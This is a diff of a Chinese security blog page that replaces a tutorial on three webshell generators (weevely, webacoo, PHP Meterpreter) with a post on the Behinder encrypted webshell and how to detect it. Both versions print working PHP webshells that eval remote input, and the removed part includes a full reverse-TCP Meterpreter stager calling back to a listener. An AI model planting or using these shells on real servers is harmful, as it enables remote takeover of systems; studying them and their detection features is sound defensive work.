@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>生成webshell的三个工具 | Cheekkk&#39;s Anti-Gravity Galaxy</title>
+  <title>冰蝎webshell与通信方式 | Cheekkk&#39;s Anti-Gravity Galaxy</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -118,7 +118,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    993 字
+                    829 字
                   </span>
                 
 
@@ -128,7 +128,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    8
+                    4
                      分钟
                   </span>
                 
@@ -157,67 +157,107 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <p>weevely、webacoo、PHP Meterpreter使用方法简介</p>
+              <p>使用方法与特性简介</p>
 <a id="more"></a>
 
-<h1 id="生成webshell的三个工具"><a href="#生成webshell的三个工具" class="headerlink" title="生成webshell的三个工具"></a>生成webshell的三个工具</h1><h2 id="01-weevely"><a href="#01-weevely" class="headerlink" title="01 weevely"></a>01 weevely</h2><p>在kali中输入weevely，可以显示出帮助banner</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/1.png" srcset="/img/loading.gif" alt></p>
-<p>连接：weevely &lt;url&gt; &lt;password&gt; [cmd]</p>
-<p>恢复Session：weevely session &lt;path&gt; [cmd]</p>
-<p>生成webshell：weevely generate &lt;password&gt; &lt;path&gt;</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/2.png" srcset="/img/loading.gif" alt><br>如图，生成一个密码为pass的webshell test.php ,内容如下</p>
+<h1 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h1><h2 id="00-项目地址"><a href="#00-项目地址" class="headerlink" title="00 项目地址"></a>00 项目地址</h2><p><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">GitHub地址</a><br>可以在此处看到作者的介绍</p>
+<p>下面是摘抄的作者运行环境介绍和FAQ</p>
+<ul>
+<li><p>运行环境</p>
+<ul>
+<li>客户端：jre6~jre8</li>
+<li>服务端：.net 2.0+;php 5.4-7.2;java 6+</li>
+</ul>
+</li>
+<li><p>FAQ</p>
+<ul>
+<li><p>Mac系统下好像打不开？</p>
+<p>Mac系统下需要通过-XstartOnFirstThread参数启动，java -XstartOnFirstThread -jar Behinder.jar。</p>
+</li>
+<li><p>直接用浏览器访问shell会报错？</p>
+<p>客户端附带的服务端为最简版本，没有做容错处理，所以直接浏览器访问可能会报错，但是不影响客户端正常连接。如果不介意服务端体积增加几个字节，可以自己加一些容错判断语句。</p>
+</li>
+<li><p>我可以对shell进行修改么？</p>
+<p>客户端附带的服务端可以进行各种变形，只要基本逻辑不变，客户端即可正常连接。</p>
+</li>
+<li><p>开了socks代理，但是服务器并没有开启代理端口？</p>
+<p>socks代理的端口不是开在远程服务器上的，是开在本地的，利用socks客户端直接连接本地IP的代理端口即可，冰蝎会把本地端口的流量通过http隧道透传至远程服务器网络。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="01-使用"><a href="#01-使用" class="headerlink" title="01 使用"></a>01 使用</h2><p>界面如下，与同类工具相似</p>
+<p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/1.png" srcset="/img/loading.gif" alt></p>
+<p>在空白处右键即可添加新连接</p>
+<p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/3.png" srcset="/img/loading.gif" alt></p>
+<p>双击一个连接即可进行进一步操作</p>
+<p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/2.png" srcset="/img/loading.gif" alt></p>
+<p>虚拟终端、socks代理、文件管理、反弹shell、数据库管理等</p>
+<p>具体介绍可以看作者的<a href="https://xz.aliyun.com/t/2799" target="_blank" rel="noopener">介绍</a></p>
+<h2 id="02-通信"><a href="#02-通信" class="headerlink" title="02 通信"></a>02 通信</h2><p>与常见的webshell相比，冰蝎的shell最大特点是对通信进行了加密<br>以PHP代码为例进行分析，PHP shell代码如下：</p>
 <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-$S=<span class="hljs-string">'$k="1c~a1dc91c~c"c~;$kh="90732c~5c6927c~1";$kf=c~"ddf0cc~9c~4c~4bc72";$p="c~xhgv4un6Yc~'</span>;
-$C=<span class="hljs-string">'kc~&#123;$j&#125;;&#125;c~&#125;return $o;&#125;c~if(@pc~c~reg_match("/$kc~h(.+)$kc~f/",@fc~ic~lc~e_getc~_con'</span>;
-$B=<span class="hljs-string">'c~();$r=c~@basc~ec~64_encode(@x(@gzc~coc~mpress($o),$k)c~);prc~int("$p$kh$r$c~kf");&#125;'</span>;
-$b=<span class="hljs-string">'tents("php://c~c~input"),$m)=c~c~=1)&#123;c~@ob_start();@c~evc~c~al(@gzuncompc~ress(@x(c~'</span>;
-$A=str_replace(<span class="hljs-string">'g'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'cgreatgge_gfggunction'</span>);
-$M=<span class="hljs-string">'@basc~e64_decc~c~ode($m[1])c~,$k)));$o=@c~oc~b_get_c~contentsc~c~();@obc~c~_end_clean'</span>;
-$g=<span class="hljs-string">'orc~($ic~=0;$i&lt;$l;)&#123;c~for($j=c~0;(c~$j&lt;$cc~&amp;c~&amp;$i&lt;$c~l);$j++,$c~i++)&#123;$o.=$t&#123;$ic~&#125;^c~$'</span>;
-$L=<span class="hljs-string">'6f4lCS8"c~;funcc~tc~ion x(c~$t,$c~k)&#123;$c=strc~lc~en($k)c~;$l=strlen($t);$c~o="";c~f'</span>;
-$l=str_replace(<span class="hljs-string">'c~'</span>,<span class="hljs-string">''</span>,$S.$L.$g.$C.$b.$M.$B);
-$f=$A(<span class="hljs-string">''</span>,$l);$f();
+@error_reporting(<span class="hljs-number">0</span>);
+session_start();
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'pass'</span>]))
+&#123;
+    $key=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);
+    $_SESSION[<span class="hljs-string">'k'</span>]=$key;
+    <span class="hljs-keyword">print</span> $key;
+&#125;
+<span class="hljs-keyword">else</span>
+&#123;
+    $key=$_SESSION[<span class="hljs-string">'k'</span>];
+	$post=file_get_contents(<span class="hljs-string">"php://input"</span>);
+	<span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">'openssl'</span>))
+	&#123;
+		$t=<span class="hljs-string">"base64_"</span>.<span class="hljs-string">"decode"</span>;
+		$post=$t($post.<span class="hljs-string">""</span>);
+		
+		<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($post);$i++) &#123;
+    			 $post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; 
+    			&#125;
+	&#125;
+	<span class="hljs-keyword">else</span>
+	&#123;
+		$post=openssl_decrypt($post, <span class="hljs-string">"AES128"</span>, $key);
+	&#125;
+    $arr=explode(<span class="hljs-string">'|'</span>,$post);
+    $func=$arr[<span class="hljs-number">0</span>];
+    $params=$arr[<span class="hljs-number">1</span>];
+	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($p)</span> </span>&#123;<span class="hljs-keyword">eval</span>($p.<span class="hljs-string">""</span>);&#125;&#125;
+	@<span class="hljs-keyword">new</span> C($params);
+&#125;
 <span class="hljs-meta">?&gt;</span></code></pre>
 
-
-
-<p>将test.php放到web服务器的根目录下，使用weevely进行连接<br><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/3.png" srcset="/img/loading.gif" alt></p>
-<p>如图，获得了shell可以执行指令</p>
-<p>在shell中输入help可以获得功能模块列表<br><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/4.png" srcset="/img/loading.gif" alt></p>
-<p>以system_info为例，可以看到返回了系统信息<br><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/5.png" srcset="/img/loading.gif" alt></p>
-<h2 id="02-webacoo"><a href="#02-webacoo" class="headerlink" title="02 webacoo"></a>02 webacoo</h2><p>webacoo的通信内容使用cookie头传输，且内容经过base64加密</p>
-<p>在kali中输入webacoo -h即可查看帮助信息<br><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/6.png" srcset="/img/loading.gif" alt></p>
-<p>生成：webacoo -g -o test.php</p>
-<p>连接：webacoo -t -u  url</p>
-<p>生成一个newtest.php<br><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/7.png" srcset="/img/loading.gif" alt></p>
-<p>内容如下</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $b=strrev(<span class="hljs-string">"edoced_4"</span>.<span class="hljs-string">"6esab"</span>);<span class="hljs-keyword">eval</span>($b(str_replace(<span class="hljs-string">" "</span>,<span class="hljs-string">""</span>,<span class="hljs-string">"a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "</span>))); <span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>将其放到web服务器根目录中，进行连接</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/8.png" srcset="/img/loading.gif" alt></p>
-<p>输入load即可查看功能模块</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/9.png" srcset="/img/loading.gif" alt></p>
-<p>使用下载模块下载index.html</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/10.png" srcset="/img/loading.gif" alt></p>
-<p>下载成功</p>
-<h2 id="03-PHP-Meterpreter"><a href="#03-PHP-Meterpreter" class="headerlink" title="03 PHP Meterpreter"></a>03 PHP Meterpreter</h2><p>metasplot的msfvenom工具可以用来制作PHPmeterpreter</p>
-<p>输入msfvenom可以查看帮助</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/11.png" srcset="/img/loading.gif" alt></p>
-<p>选择payload为php/mterpreter/reverse_tcp，目标IP为192.168.0.105，输出格式为raw，生成的文件为meter.php</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/12.png" srcset="/img/loading.gif" alt></p>
-<p>内容如下，使用时要将第一行&lt;?php 前的注释删除</p>
-<pre><code class="hljs php"><span class="hljs-comment">/*&lt;?php /**/</span> error_reporting(<span class="hljs-number">0</span>); $ip = <span class="hljs-string">'192.168.0.105'</span>; $port = <span class="hljs-number">4444</span>; <span class="hljs-keyword">if</span> (($f = <span class="hljs-string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="hljs-string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="hljs-string">'stream'</span>; &#125; <span class="hljs-keyword">if</span> (!$s &amp;&amp; ($f = <span class="hljs-string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="hljs-string">'stream'</span>; &#125; <span class="hljs-keyword">if</span> (!$s &amp;&amp; ($f = <span class="hljs-string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="hljs-keyword">if</span> (!$res) &#123; <span class="hljs-keyword">die</span>(); &#125; $s_type = <span class="hljs-string">'socket'</span>; &#125; <span class="hljs-keyword">if</span> (!$s_type) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">'no socket funcs'</span>); &#125; <span class="hljs-keyword">if</span> (!$s) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">'no socket'</span>); &#125; <span class="hljs-keyword">switch</span> ($s_type) &#123; <span class="hljs-keyword">case</span> <span class="hljs-string">'stream'</span>: $len = fread($s, <span class="hljs-number">4</span>); <span class="hljs-keyword">break</span>; <span class="hljs-keyword">case</span> <span class="hljs-string">'socket'</span>: $len = socket_read($s, <span class="hljs-number">4</span>); <span class="hljs-keyword">break</span>; &#125; <span class="hljs-keyword">if</span> (!$len) &#123; <span class="hljs-keyword">die</span>(); &#125; $a = unpack(<span class="hljs-string">"Nlen"</span>, $len); $len = $a[<span class="hljs-string">'len'</span>]; $b = <span class="hljs-string">''</span>; <span class="hljs-keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="hljs-keyword">switch</span> ($s_type) &#123; <span class="hljs-keyword">case</span> <span class="hljs-string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="hljs-keyword">break</span>; <span class="hljs-keyword">case</span> <span class="hljs-string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="hljs-keyword">break</span>; &#125; &#125; $GLOBALS[<span class="hljs-string">'msgsock'</span>] = $s; $GLOBALS[<span class="hljs-string">'msgsock_type'</span>] = $s_type; <span class="hljs-keyword">if</span> (extension_loaded(<span class="hljs-string">'suhosin'</span>) &amp;&amp; ini_get(<span class="hljs-string">'suhosin.executor.disable_eval'</span>)) &#123; $suhosin_bypass=create_function(<span class="hljs-string">''</span>, $b); $suhosin_bypass(); &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">eval</span>($b); &#125; <span class="hljs-keyword">die</span>();</code></pre>
-
-<p>将webshell传到web服务器后，在攻击机启动msfconsole进行监听</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/13.png" srcset="/img/loading.gif" alt></p>
-<p>使用exploit/multi/handler模块</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/14.png" srcset="/img/loading.gif" alt></p>
-<p>设置payload为php/mterpreter/reverse_tcp</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/15.png" srcset="/img/loading.gif" alt></p>
-<p>设置LHOST为192.168.0.105</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/16.png" srcset="/img/loading.gif" alt></p>
-<p>输入exploit即可开始监听，当浏览器访问meter.php之后即可获得shell</p>
-<p><img src="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/17.png" srcset="/img/loading.gif" alt></p>
+<p>通信过程：</p>
+<ol>
+<li><p>检测GET请求是否有?pass参数，产生随机的16位长密钥写入session，可以抓包分析密钥与PHPSESSID的对应情况<br>密钥生成方式如下，确保密钥难以计算和预测</p>
+<pre><code class="hljs php">$key=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);</code></pre>
+</li>
+<li><p>检测是否开启了OpenSSL</p>
+<ul>
+<li>如果开启，就使用密钥进行AES加密</li>
+<li>如果没有开启，就进行异或然后base64加密</li>
+</ul>
+</li>
+</ol>
+<p>作者所作流程图如下：</p>
+<p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/4.png" srcset="/img/loading.gif" alt></p>
+<p>更详细的介绍可以看 <a href="https://xz.aliyun.com/t/2774" target="_blank" rel="noopener">这里</a></p>
+<h2 id="03-检测"><a href="#03-检测" class="headerlink" title="03 检测"></a>03 检测</h2><p>由于冰蝎对通信过程进行了加密，一般的检测方法无法识别出其中的恶意内容，但它仍存在一些可供检测的特征</p>
+<ol>
+<li><p>连接开始时固定发送一个有pass参数GET请求</p>
+</li>
+<li><p>获取密钥时固定返回一个16位的密钥，可以用正则判断</p>
+</li>
+<li><p>v1.0版本中User-Agent头为JDK版本，之后的版本为在十几种常见User-Agent头中随机选取，下图来自网络</p>
+<p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/5.png" srcset="/img/loading.gif" alt></p>
+</li>
+<li><p>shell中含有加密、解密、命令执行等相关关键字，可以据此对上传的文件进行判断</p>
+</li>
+<li><p>对通信数据的base64编码和二进制编码进行匹配</p>
+</li>
+</ol>
 
             </article>
             <hr>
@@ -227,15 +267,13 @@ $f=$A(<span class="hljs-string">''</span>,$l);$f();
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
                     
                   </div>
                 
                 
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
                     
                       <a class="hover-with-bg" href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
                     
@@ -252,18 +290,12 @@ $f=$A(<span class="hljs-string">''</span>,$l);$f();
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CRLF注入漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/XSS%E7%9A%84%E7%AE%80%E5%8D%95%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F/">
-                        <span class="hidden-mobile">XSS的简单防御方式</span>
+                      <a href="/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-CVE-2014-0160/">
+                        <span class="hidden-mobile">心脏滴血漏洞简介 CVE-2014-0160</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -403,7 +435,7 @@ $f=$A(<span class="hljs-string">''</span>,$l);$f();
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "生成webshell的三个工具&nbsp;",
+        "冰蝎webshell与通信方式&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 40,
